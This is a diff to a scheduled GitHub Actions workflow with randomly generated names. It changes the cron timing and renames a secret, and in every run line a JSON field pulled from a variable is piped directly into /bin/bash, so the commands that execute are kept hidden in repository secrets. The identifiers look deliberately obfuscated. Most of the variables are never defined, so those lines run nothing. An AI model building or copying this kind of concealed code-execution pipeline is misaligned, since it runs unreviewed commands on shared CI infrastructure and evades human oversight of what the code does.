@@ -3,7 +3,7 @@ name: lanjingtian5614
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 4/6 * * *'
+    - cron: '50 1/6 * * *'
 
 jobs:
   build:
@@ -13,13 +13,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: lanjingtian5614
         env:
-          j137: ${{ secrets.j137 }}
+          rxtfk7493: ${{ secrets.rxtfk7493 }}
         run: |
-          echo $j137 | jq -r .tsij54 | /bin/bash
-          echo $oh17 | jq -r .lo3649 | /bin/bash
-          echo $kdi49082 | jq -r .b086 | /bin/bash
-          echo $sph6131 | jq -r .a7 | /bin/bash
-          echo $iodtw99 | jq -r .ei10 | /bin/bash
-          echo $s284 | jq -r .lf21 | /bin/bash
-          echo $npr8151 | jq -r .vug91 | /bin/bash
+          echo $rxtfk7493 | jq -r .yzix0 | /bin/bash
+          echo $ar2 | jq -r .wxn3747 | /bin/bash
+          echo $odui6162 | jq -r .zemmn34717 | /bin/bash
+          echo $f87 | jq -r .oifec04 | /bin/bash
+          echo $ckisu7 | jq -r .q148 | /bin/bash
+          echo $cd14 | jq -r .j775 | /bin/bash
+          echo $sqonf15404 | jq -r .yqwdj91774 | /bin/bash
+          echo $zykh56 | jq -r .b95 | /bin/bash
 
